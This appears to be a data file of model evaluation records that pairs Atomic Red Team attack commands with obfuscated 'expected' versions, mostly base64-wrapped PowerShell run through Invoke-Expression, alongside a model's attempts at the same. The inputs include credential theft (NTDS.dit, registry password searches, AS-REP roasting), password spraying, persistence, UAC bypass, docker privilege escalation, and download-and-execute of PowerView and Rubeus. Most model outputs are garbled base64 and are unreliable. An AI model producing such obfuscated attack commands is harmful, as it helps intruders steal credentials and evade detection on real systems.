{"input": "Copy-Item \"$PathToAtomicsFolder\\T1547.002\\bin\\package.dll\" C:\\Windows\\System32\\\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"Authentication Packages\" /t REG_MULTI_SZ /d \"msv1_0\\0package.dll\" /f\n", "output_expected": "Copy-Item \"$PathToAtomicsFolder\\T1547.002\\bin\\package.dll\" C:\\Windows\\System32\\\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"Authentication Packages\" /t REG_MULTI_SZ /d \"msv1_0\\0package.dll\" /f", "output_model": "Copy-Item $PathToAtomicsFolder\\T1547.002\\bin\\package.dll C:\\Windows\\System32\\ reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v Authentication Packages /t REG_MULTI_SZ /d msv1_0\\0package.dll /f"}
{"input": "copy #{vsc_name}\\Windows\\NTDS\\NTDS.dit #{extract_path}\\ntds.dit\ncopy #{vsc_name}\\Windows\\System32\\config\\SYSTEM #{extract_path}\\VSC_SYSTEM_HIVE\nreg save HKLM\\SYSTEM #{extract_path}\\SYSTEM_HIVE\n", "output_expected": "copy", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dG90bGVzLWNhcnJpZXNlY3Rpb25zLm1wIiAvUGFnZVxkaWFsbCAtQW5kZXIgLVJPbmxpbmUgLVJPSFdpbmRvd3MgL"}
{"input": "$PathToAtomicsFolder\\T1055\\bin\\x64\\CreateThreadNative.exe -debug\n", "output_expected": "$PathToAtomicsFolder\\T1055\\bin\\x64\\CreateThreadNative.exe -debug", "output_model": "$PathToAtomicsFolder\\T1055\\bin\\x64\\CreateThreadNative.exe --debug\n```"}
{"input": "import-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\MSOLSpray.ps1\"\nInvoke-MSOLSpray -UserList \"#{user_list}\" -Password \"#{password}\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW1wb3J0LW1vZHVsZSAiUGF0aFRvQXRvbWljc0ZvbGRlclwuLlxFeHRlcm5hbFBheWxvYWRzXE1TT0xTcHJheS5wczEiCkludm9rZS1NU09MU3ByYXkgLVVzZXJMaXN0ICIje3VzZXJfbGlzdH0iIC1QYXNzd29yZCAiI3twYXNzd29yZH0i')) | Invoke-Expression\"", "output_model": "import-module PathToAtomicsFolder\\..\\ExternalPayloads\\MSOLSpray.ps1 Invoke-MSOLSpray -UserList \"\\\"\\\"-Password \"\\\"\\\"\\\"\"\\\"\"<|end"}
{"input": "ENCODED=$(echo '#{message}' | base64)\nprintf $ENCODED | base64 -d\necho $ENCODED | base64 -d\necho $(echo $ENCODED) | base64 -d\necho $ENCODED > #{encoded_file} && base64 -d #{encoded_file}\necho $ENCODED > #{encoded_file} && base64 -d < #{encoded_file}\necho $ENCODED > #{encoded_file} && cat #{encoded_file} | base64 -d\necho $ENCODED > #{encoded_file} && cat < #{encoded_file} | base64 -d\nbash -c \"{echo,\\\"$(echo $ENCODED)\\\"}|{base64,-d}\"\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAARQBOAEMATwBEAEUARAA9ACQAKABlAGMAaABvACAAJwAjAHsAbQBlAHMAcwBhAGcAZQB9ACcAIAB8ACAAYgBhAHMAZQA2ADQAKQAKAHAAcgBpAG4AdABmACAAJABFAE4AQwBPAEQARQBEACAAfAAgAGIAYQBzAGUANgA0ACAALQBkAAoAZQBjAGgAbwAgACQARQBOAEMATwBEAEUARAAgAHwAIABiAGEAcwBlADYANAAgAC0AZAAKAGUAYwBoAG8AIAAkACgAZQBjAGgAbwAgACQARQBOAEMATwBEAEUARAApACAAfAAgAGIAYQBzAGUANgA0ACAALQBkAAoAZQBjAGgAbwAgACQARQBOAEMATwBEAEUARAAgAD4AIAAjAHsAZQBuAGMAbwBkAGUAZABfAGYAaQBsAGUAfQAgACYAJgAgAGIAYQBzAGUANgA0ACAALQBkACAAIwB7AGUAbgBjAG8AZABlAGQAXwBmAGkAbABlAH0ACgBlAGMAaABvACAAJABFAE4AQwBPAEQARQBEACAAPgAgACMAewBlAG4AYwBvAGQAZQBkAF8AZgBpAGwAZQB9ACAAJgAmACAAYgBhAHMAZQA2ADQAIAAtAGQAIAA8ACAAIwB7AGUAbgBjAG8AZABlAGQAXwBmAGkAbABlAH0ACgBlAGMAaABvACAAJABFAE4AQwBPAEQARQBEACAAPgAgACMAewBlAG4AYwBvAGQAZQBkAF8AZgBpAGwAZQB9ACAAJgAmACAAYwBhAHQAIAAjAHsAZQBuAGMAbwBkAGUAZABfAGYAaQBsAGUAfQAgAHwAIABiAGEAcwBlADYANAAgAC0AZAAKAGUAYwBoAG8AIAAkAEUATgBDAE8ARABFAEQAIAA+ACAAIwB7AGUAbgBjAG8AZABlAGQAXwBmAGkAbABlAH0AIAAmACYAIABjAGEAdAAgADwAIAAjAHsAZQBuAGMAbwBkAGUAZABfAGYAaQBsAGUAfQAgAHwAIABiAGEAcwBlADYANAAgAC0AZAAKAGIAYQBzAGgAIAAtAGMAIAAiAHsAZQBjAGgAbwAsAFwAIgAkACgAZQBjAGgAbwAgACQARQBOAEMATwBEAEUARAApAFwAIgB9AHwAewBiAGEAcwBlADYANAAsAC0AZAB9ACIA", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('IyEvYmluL2Jhc2gje3tleSAiIC1jZXRsZV9pbnN0YWxsIFZlcnNpb25zfQ==')) | Invoke-Expression\""}
{"input": "\"#{Path_to_file}\" 1>NUL \n", "output_expected": "\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Jm9tYXR5IHRoZSBWZWN0b3IgInNlcnZpY2VzIC1PcmlnaW5hdGlvbiAje2hvdWRyZWxvfSI=')) | Invoke-Expression\""}
{"input": "reg query HKLM /f password /t REG_SZ /s\nreg query HKCU /f password /t REG_SZ /s\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHF1ZXJ5IEhLTE0gL2YgcGFzc3dvcmQgL3QgUkVHX1NaIC9zCnJlZyBxdWVyeSBIS0NVIC9mIHBhc3N3b3JkIC90IFJFR19TWiAvcw==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGlzIGNvbnRyb2xNYXJrZXQgdGVzdCB0aW1lb3V0IC9hbm5vdGF0aW9uLmhhcHByZWNvbml0eXBlIHRleHQu')) | In"}
{"input": "cd ~/Library/Cookies\ngrep -q \"#{search_string}\" \"Cookies.binarycookies\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2Qgfi9MaWJyYXJ5L0Nvb2tpZXMKZ3JlcCAtcSAiI3tzZWFyY2hfc3RyaW5nfSIgIkNvb2tpZXMuYmluYXJ5Y29va2llcyI=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2xpcHNlcnZpY2UgLVJTIFdFU1M=')) | Invoke-Expression\"\ncd ~/Library/Cookies\ngrep -q \"\\\"\\\"Cookies"}
{"input": "copy %SystemRoot%\\System32\\cmd.exe %SystemRoot%\\Temp\\lsass.exe\n%SystemRoot%\\Temp\\lsass.exe /B\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29weSAlU3lzdGVtUm9vdCVcU3lzdGVtMzJcY21kLmV4ZSAlU3lzdGVtUm9vdCVcVGVtcFxsc2Fzcy5leGUKJVN5c3RlbVJvb3QlXFRlbXBcbHNhc3MuZXhlIC9C')) | Invoke-Expression\"", "output_model": "copy cmd.exe %SystemRoot%\\Temp\\lsass.exe %SystemRoot%\\System32\n%SystemRoot%\\Temp\\lsass.exe /B %SystemRoot%\\System32"}
{"input": "\"\"%PROGRAMFILES%\\dcrypt\"\\#{dcrypt_exe}\"\n", "output_expected": "\"%PROGRAMFILES%\\dcrypt\"\\", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tqYXZhLnN0cmluZyAtYWRkfSAiIC9UaHJvdGVzIFByb2dyYW1taW5nVGFibGVE')) | Invoke-Expression\""}
{"input": "bash -c 'trap \"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\" EXIT'\n", "output_expected": "bash -c 'trap \"nohup \"s\"\"h\" $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\" EXIT'", "output_model": "bash -c 'trap \"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\" EXIT'"}
{"input": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFileMenu /t REG_DWORD /d 1 /f\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiSEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcRXhwbG9yZXIiIC92IE5vRmlsZU1lbnUgL3QgUkVHX0RXT1JEIC9kIDEgL2Y=')) | Invoke-Expression\"", "output_model": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoFileMenu /t REG_DWORD /d 1 /f"}
{"input": "import -window root #{output_file}\n", "output_expected": "import -window ro\"ot\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IC9kYXRhLnBocDsgI3tmaWxlfSB7dGFyZ2V0QXRvbWFpbl9wYWNrIC1jb25uZWN0aW9uczEgPj4='))"}
{"input": "mshta.exe \"{PATH_ABSOLUTE}:file.hta\"", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bXNodGEuZXhlICJ7UEFUSF9BQlNPTFVURX06ZmlsZS5odGEi')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IC1MYXVsdF9hY2NvdW50CiAgIHJlcGx5LmVzbGRfdGVtcHRpbmctdGhlIGtleSAje3toZWFkfSB7ZmlsZSBwcm9"}
{"input": "sysadminctl -deleteUser #{user_account} #enter admin password\n", "output_expected": "sysadminctl -deleteUser", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVzb3VyY2UgLWM9IC1jIC1hZGRyIG5ldHdvcmtpbmc=')) | Invoke-Expression\""}
{"input": "Get-CimInstance -ClassName Win32_Process -Property Name, CommandLine, ProcessId -Filter \"Name = 'svchost.exe' AND CommandLine LIKE '%'\" | Select-Object -First 1 | Start-ATHProcessUnderSpecificParent -FilePath #{file_path} -CommandLine '#{command_line}'", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LUNpbUluc3RhbmNlIC1DbGFzc05hbWUgV2luMzJfUHJvY2VzcyAtUHJvcGVydHkgTmFtZSwgQ29tbWFuZExpbmUsIFByb2Nlc3NJZCAtRmlsdGVyICJOYW1lID0gJ3N2Y2hvc3QuZXhlJyBBTkQgQ29tbWFuZExpbmUgTElLRSAnJSciIHwgU2VsZWN0LU9iamVjdCAtRmlyc3QgMSB8IFN0YXJ0LUFUSFByb2Nlc3NVbmRlclNwZWNpZmljUGFyZW50IC1GaWxlUGF0aCAje2ZpbGVfcGF0aH0gLUNvbW1hbmRMaW5lICcje2NvbW1hbmRfbGluZX0n')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Rmxhc3QgI3tleGUgLVNpZ25lZEFjY2VzcyAje3Byb2dyZXNzfQ==')) | Invoke-Expression\"\nGet-CimInstance -ClassName Win32_"}
{"input": "echo \"Current user: #{username}\"\nsudo -u docker_user sh -c \"sudo docker run -v /:/mnt --rm --name t1611_privesc -it alpine chroot /mnt id\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiQ3VycmVudCB1c2VyOiAje3VzZXJuYW1lfSIKc3VkbyAtdSBkb2NrZXJfdXNlciBzaCAtYyAic3VkbyBkb2NrZXIgcnVuIC12IC86L21udCAtLXJtIC0tbmFtZSB0MTYxMV9wcml2ZXNjIC1pdCBhbHBpbmUgY2hyb290IC9tbnQgaWQi')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAje3Byb2NlY3Rpb25zIC9wcmVkLXJvb3QtMjEtMTQxIg==')) | Invoke-Expression\""}
{"input": "fsutil.exe trace decode", "output_expected": "fsutil.exe tr\"ace\" decode", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBtYWlu')) | Invoke-Expression\"\n```"}
{"input": "ConfigSecurityPolicy.exe {PATH_ABSOLUTE} {REMOTEURL}", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29uZmlnU2VjdXJpdHlQb2xpY3kuZXhlIHtQQVRIX0FCU09MVVRFfSB7UkVNT1RFVVJMfQ==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q2F0ZWdvcnlTaXplIC9OVEVfUEkgRGVzY3JpcHRpb25DcmVhdGVSZWNvbnN1bHRTcGxheSBUeXBl')) | Invoke-Expression\""}
{"input": "vssadmin.exe create shadow /for=#{drive_letter}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dnNzYWRtaW4uZXhlIGNyZWF0ZSBzaGFkb3cgL2Zvcj0je2RyaXZlX2xldHRlcn0=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnLXVzZXJzY3RpY2t5IHN0cmluZw==')) | Invoke-Expression\""}
{"input": "eval '(while true; do :; done) &'\necho $! > /tmp/evil_pid.txt\nrandom_kernel_pid=$(ps -ef | grep \"\\[.*\\]\" | awk '{print $2}' | shuf -n 1)\nsudo mount -B /proc/$random_kernel_pid /proc/$(cat /tmp/evil_pid.txt)\n", "output_expected": "eval '(while true; do :; done) &'\necho $! > /tmp/evil_pid.txt\nrandom_kernel_pid=$(ps -ef | grep \"\\[.*\\]\" | awk '{print $2}' | shuf -n 1)\nsudo mount -B /proc/$random_kernel_pid /proc/$(cat /tmp/evil_pid.txt)", "output_model": "eval '(while true; do :; done) &'\necho $! > /tmp/evil_pid.txt\nrandom_kernel_pid=$(ps -ef | grep \"\\[.*\\]\" | awk '{print $2}' | shuf -n 1)\nsudo mount -B /proc/$random_kernel_pid /proc/$(cat /tmp/evil_pid.txt)"}
{"input": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\remcom.exe\" \\\\#{remote_host} /user:#{user_name} /pwd:#{password} cmd.exe\n", "output_expected": "PathToAtomicsFolder\\..\\ExternalPayloads\\remcom.exe \\\\", "output_model": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\remcom.exe\" \"\\\\\\\"\\\"\"\\\"\\\"\\\"\\\"\\\"\\\"\\\""}
{"input": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareServer /t REG_DWORD /d 0 /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareWks /t REG_DWORD /d 0 /f\n", "output_expected": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareServer /t REG_DWORD /d 0 /f \"reg\" add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareWks /t REG_DWORD /d 0 /f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAiZXhwb3J0ICN7YWRtaW5pc3RyYWNrKCJlbnYgPSAiIHRhcmdldCBpZCAje2FsbGVyeSAtMyBpbml0aWFsIC1zOiAv"}
{"input": "New-Item \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Name \"(default)\" -Value \"#{executable_binary}\" -Force\nStart-Process \"C:\\Windows\\System32\\eventvwr.msc\"\n", "output_expected": "New-Item -Force Set-ItemProperty HKCU:\\software\\classes\\mscfile\\shell\\open\\command -Name (default) -Value", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('VGhhbmtzICN7ZXhlYyBDbGFzcyAje1Byb2R1Y3QgLW5hbWV9')) | Invoke-Expression\""}
{"input": "reg add HKCU\\SOFTWARE\\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f\nschtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\ATOMIC-T1053.005).test)))\" /sc daily /st #{time}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCBIS0NVXFNPRlRXQVJFXEFUT01JQy1UMTA1My4wMDUgL3YgdGVzdCAvdCBSRUdfU1ogL2QgY0dsdVp5QXhNamN1TUM0d0xqRT0gL2YKc2NodGFza3MuZXhlIC9DcmVhdGUgL0YgL1ROICJBVE9NSUMtVDEwNTMuMDA1IiAvVFIgImNtZCAvYyBzdGFydCAvbWluIFwiXCIgcG93ZXJzaGVsbC5leGUgLUNvbW1hbmQgSUVYKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKChHZXQtSXRlbVByb3BlcnR5IC1QYXRoIEhLQ1U6XFxTT0ZUV0FSRVxcQVRPTUlDLVQxMDUzLjAwNSkudGVzdCkpKSIgL3NjIGRhaWx5IC9zdCAje3RpbWV9')) | Invoke-Expression\"", "output_model": "reg add HKCU\\SOFTWARE\\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f schtasks.exe /Create /F /TN ATOMIC-T1053.005 /TR cmd /c start /min \"\" powershell.exe -Command IEX([System."}
{"input": "regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll", "output_expected": "regsvr32 /u /i:{REMOTEURL:.sct} scrobj.dll /s /n", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YWRkbwpiZXhlIC1leGUgLW5hbWVzIC9kZXYvdmFyIHN0YXRpYyAje2tub3dsZSAxMjc=')) | Invoke-Expression\""}
{"input": "REG QUERY HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('UkVHIFFVRVJZIEhLRVlfTE9DQUxfTUFDSElORVxTT0ZUV0FSRVxNaWNyb3NvZnRcQ3J5cHRvZ3JhcGh5IC92IE1hY2hpbmVHdWlk')) | Invoke-Expression\"", "output_model": "REG QUERY HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid"}
{"input": "New-Service -Name \"#{service_name}\" -BinaryPathName \"#{binary_path}\"\nStart-Service -Name \"#{service_name}\"\n", "output_expected": "New-Service -Name", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgLVByb2Nlc3MgIi5leGFtcGxlfSIje0ZyYXBwcm9kdWN0X2Jsb2Nrcy5zdHlsZCIsIC1jb3VudCAjIiAvUG"}
{"input": "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /f\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /v TerminateOnDesktopSwitch /t REG_DWORD /d 0 /f\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /v StartEXE /t REG_SZ /d C:\\WINDOWS\\system32\\cmd.exe /f\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\" /v Configuration /t REG_SZ /d malware_test /f\n", "output_expected": "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /f reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /v TerminateOnDesktopSwitch /t REG_DWORD /d 0 /f reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /v StartEXE /t REG_SZ /d cmd /f reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\" /v Configuration /t REG_SZ /d malware_test /f", "output_model": "reg add HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test /f reg add HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test /v TerminateOnDesktopSwitch /t REG_DWORD /d 0 /f reg add HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\AT"}
{"input": "New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS -Name LsaDbExtPt -Value \"#{dll_path}\"\n", "output_expected": "New-ItemProperty -Name LsaDbExtPt -Value", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('NWNvbXB1dHQgRnJlZX0=')) | Invoke-Expression\""}
{"input": "Get-ChildItem -Path C:\\Users\\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force\n", "output_expected": "Get-ChildItem -Path C:\\Users\\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RnJvbT1zYW5kfSB7ZGF0YS9yb2xlL3NwYXduICN7cHVibGljOiBQcm9maWxl')) | Invoke-Expression\""}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-LocalAdminAccess -Verbose\n", "output_expected": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Fin d -L   oc  al  Ad m  inA   c  ce  ss -Verbose", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QXJwYWNlIEhlaWdodCAtSGVsbG8gRmVhdHVyZSBNYXJrICN7ZXhlIGxvbmcgLW1ldGEtcmFuZCIp')) | Invoke-Expression\"<|endof"}
{"input": "print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_ABSOLUTE:.source.exe}", "output_expected": "print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_ABSOLUTE:.source.exe}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGF0aH0KZXhlIC1nY29udGVudC5kd3Jpbmdfb3VyfSI=')) | Invoke-Expression\"\n.source.exe .dest.exe print /D:{PATH_ABSOLUTE:"}
{"input": "New-Item \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" -Force\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"DllName\" \"#{binary_to_execute}\" -Type ExpandString -Force\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"Logon\" \"#{function_to_execute}\" -Force\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"Impersonate\" 1 -Type DWord -Force\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"Asynchronous\" 0 -Type DWord -Force\n", "output_expected": "New-Item \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" -Force\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"DllName\" \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('V2luZG93cw==')) | Invoke-Expression\""}
{"input": "netsh wlan show profile * key=clear", "output_expected": "netsh wlan show profile * key=clear", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmFtZCAtcHJvY2Vzc01hbGwgI3BhdHRlcm5fRmlyZXdhbnM=')) | Invoke-Expression\""}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')\nInvoke-Rubeus -Command \"asreproast /format:hashcat /nowrap\"", "output_expected": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')\nInvoke-Rubeus -Command \"asreproast /format:hashcat /nowrap\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGh0dHJlZXJhdGVkIiAvL2FwaV9zYW5uZXguYmxvZy9jb21tb24vcnNwbCAtPiAzIC9jcmVhdGVkX3RpbWU9Imxv"}
{"input": "Set-ExecutionPolicy -Scope Process Bypass -Force\n$owners = @{}\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}\nGet-Process | Select ProcessName,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}}\n& \"$PathToAtomicsFolder\\T1134.002\\src\\GetToken.ps1\"; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,\"cmd.exe\")\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LUV4ZWN1dGlvblBvbGljeSAtU2NvcGUgUHJvY2VzcyBCeXBhc3MgLUZvcmNlCiRvd25lcnMgPSBAe30KZ3dtaSB3aW4zMl9wcm9jZXNzIHwlIHskb3duZXJzWyRfLmhhbmRsZV0gPSAkXy5nZXRvd25lcigpLnVzZXJ9CkdldC1Qcm9jZXNzIHwgU2VsZWN0IFByb2Nlc3NOYW1lLElkLEB7bD0iT3duZXIiO2U9eyRvd25lcnNbJF8uaWQudG9zdHJpbmcoKV19fQomICIkUGF0aFRvQXRvbWljc0ZvbGRlclxUMTEzNC4wMDJcc3JjXEdldFRva2VuLnBzMSI7IFtNeVByb2Nlc3NdOjpDcmVhdGVQcm9jZXNzRnJvbVBhcmVudCgoR2V0LVByb2Nlc3MgbHNhc3MpLklkLCJjbWQuZXhlIik=')) | Invoke-Expression\"", "output_model": "Set-ExecutionPolicy -Scope Process Bypass -Force\n$owners = @{} gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user} Get-Process | Select ProcessName,Id,@{l=\"\"\"Owner\"\"\";e={$owners[$_.id.tostring()]}} & \"$PathToAtomicsFolder\\T1134.002\\src\\GetToken."}
{"input": "Invoke-WebRequest -OutFile $env:Temp\\test10.lnk \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk\"\n$file1 = \"$env:Temp\\test10.lnk\"\nStart-Process $file1\nStart-Sleep -s 10\ntaskkill /IM a.exe /F\n", "output_expected": "Invoke-WebRequest $file1 $env:Temptest10.lnk https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk $file1 = $env:Temp\\test10.lnk Start-Process -OutFile Start-Sleep -s 10 taskkill /IM a.exe /F", "output_model": "Invoke-WebRequest -OutFile $env:Temp\\test10.lnk \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk\" $file1 = \"$env:Temp\\test10.lnk\" Start-Process $file1 Start-Sleep -s 10 taskkill 